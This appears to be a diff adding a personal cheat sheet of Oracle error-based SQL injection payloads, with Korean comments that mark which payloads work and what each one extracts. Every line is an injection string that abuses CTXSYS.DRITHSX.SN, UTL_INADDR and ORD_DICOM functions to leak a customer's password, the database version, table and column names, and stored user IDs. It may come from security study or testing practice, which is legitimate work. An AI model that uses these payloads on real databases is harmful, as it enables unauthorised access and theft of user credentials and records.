@@ -1,0 +1,19 @@
+' and 
+UTL_INADDR.GET_HOST_NAME((select password from customer where name="123123")) 됨
+UTL_INAADR.GET_HOST_ADDRESS((원하는 서브쿼리 내용))
+ORDSYS.ORD_DICOM.GETMAPPINGXPATH((원하는 서브쿼리 내용),user,user)
+CTXSYS.DRITHSX.SN(user,(원하는 서브쿼리 내용)) 됨
+
+' and CTXSYS.DRITHSX.SN(user,(select password from customer where name='123123'))=1 --
+' and UTL_INADDR.GET_HOST_NAME((select password from customer where name='123123'))=1 -- 특정 비밀번호 알아내기
+
+' and ORDSYS.ORD_DICOM.GETMAPPINGXPATH((select password from customer where name='123123'),user,user)=1 -- 안되는듯
+' and UTL_INAADR.GET_HOST_ADDRESS((select password from customer where name='123123'))=1 -- 안되는듯
+
+' and CTXSYS.DRITHSX.SN(user,(select banner from v$version WHERE banner LIKE '%Oracle%'))=1 -- 오라클 버전 알아내기
+
+' and CTXSYS.DRITHSX.SN(user,(SELECT table_name FROM (SELECT table_name, ROWNUM AS RNUM FROM user_tables) WHERE RNUM=6))=1 -- 6번째로 만든 테이블 명 알아내기
+' and CTXSYS.DRITHSX.SN(user,(SELECT COUNT(COLUMN_NAME) FROM all_tab_columns WHERE table_name='CUSTOMER'))=1 -- CUSTOMER 테이블의 컬럼갯수 알아내기 ( 대소문자 구별 )
+' and CTXSYS.DRITHSX.SN(user,(SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME, ROWNUM AS RNUM FROM all_tab_columns where TABLE_NAME='CUSTOMER') WHERE RNUM=3))=1 -- 커스터머의 컬럼명 알아내기
+' and CTXSYS.DRITHSX.SN(user,(SELECT name FROM (SELECT name, ROWNUM AS RNUM FROM customer) WHERE RNUM=25))=1 --25번째 데이터에 있는 아이디 알아내기
+' and UTL_INADDR.GET_HOST_NAME((select password from customer where name='hashpassword'))=1 -- NAME이 hashpassword 인 데이터의 password 알아내기
